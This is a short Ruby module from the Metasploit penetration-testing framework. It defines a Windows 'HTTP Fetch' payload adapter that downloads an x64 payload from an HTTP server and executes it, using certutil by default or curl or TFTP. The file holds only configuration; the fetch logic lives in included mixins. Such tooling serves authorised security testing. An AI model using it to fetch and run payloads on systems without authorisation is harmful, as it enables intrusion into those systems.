##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter::Fetch::HTTP
  include Msf::Payload::Adapter::Fetch::WindowsOptions

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'HTTP Fetch',
        'Description' => 'Fetch and Execute an x64 payload from an http server',
        'DefaultOptions' => { 'FETCH_COMMAND' => 'CERTUTIL' },
        'Author' => 'Brendan Watters',
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_X64,
        'AdaptedPlatform' => 'win'
      )
    )
    deregister_options('FETCH_COMMAND')
    register_options(
      [
        Msf::OptEnum.new('FETCH_COMMAND', [true, 'Command to fetch payload', 'CERTUTIL', %w[CURL TFTP CERTUTIL]])
      ]
    )
  end
end
